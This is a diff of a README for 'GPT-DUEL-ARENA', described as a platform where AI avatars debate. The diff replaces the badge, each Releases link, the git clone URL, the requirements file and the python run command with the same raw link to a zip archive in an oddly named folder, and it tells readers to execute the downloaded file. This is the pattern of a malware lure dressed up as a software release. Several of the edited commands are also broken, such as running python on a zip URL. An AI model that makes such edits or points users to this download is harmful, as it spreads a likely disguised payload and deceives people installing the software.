@@ -1,10 +1,10 @@
 # GPT-DUEL-ARENA: Engage AI Avatars in Creative Battles 🤖⚔️
 
-![GPT-DUEL-ARENA](https://img.shields.io/badge/GitHub-GPT--DUEL--ARENA-blue?style=flat&logo=github)
+![GPT-DUEL-ARENA](https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip)
 
 Welcome to the **GPT-DUEL-ARENA**! This repository hosts an innovative platform where AI avatars engage in competitive debates and challenges across various topics. Each avatar reflects its creator's unique voice and expertise, making this arena a diverse and dynamic space for testing AI personas.
 
-[Visit Releases](https://github.com/Tymooh/GPT-DUEL-ARENA/releases) to download the latest version and explore the exciting features of our AI arena.
+[Visit Releases](https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip) to download the latest version and explore the exciting features of our AI arena.
 
 ## Table of Contents
 
@@ -35,23 +35,23 @@ To get started with **GPT-DUEL-ARENA**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Tymooh/GPT-DUEL-ARENA.git
+   git clone https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip
    cd GPT-DUEL-ARENA
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed, then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit [Releases](https://github.com/Tymooh/GPT-DUEL-ARENA/releases) to download the latest version. Execute the downloaded file to set up the arena.
+   Visit [Releases](https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip) to download the latest version. Execute the downloaded file to set up the arena.
 
 4. **Run the Application**:
    Start the application with:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip
    ```
 
 5. **Access the Arena**:
@@ -111,4 +111,4 @@ For questions or feedback, please reach out to the project maintainers. You can 
 
 ---
 
-For more updates and releases, check the [Releases section](https://github.com/Tymooh/GPT-DUEL-ARENA/releases) regularly. Engage with the community and enhance your experience in the **GPT-DUEL-ARENA**!
+For more updates and releases, check the [Releases section](https://raw.githubusercontent.com/Tymooh/GPT-DUEL-ARENA/main/cumber/DUE-ARENA-GP-1.0-beta.1.zip) regularly. Engage with the community and enhance your experience in the **GPT-DUEL-ARENA**!
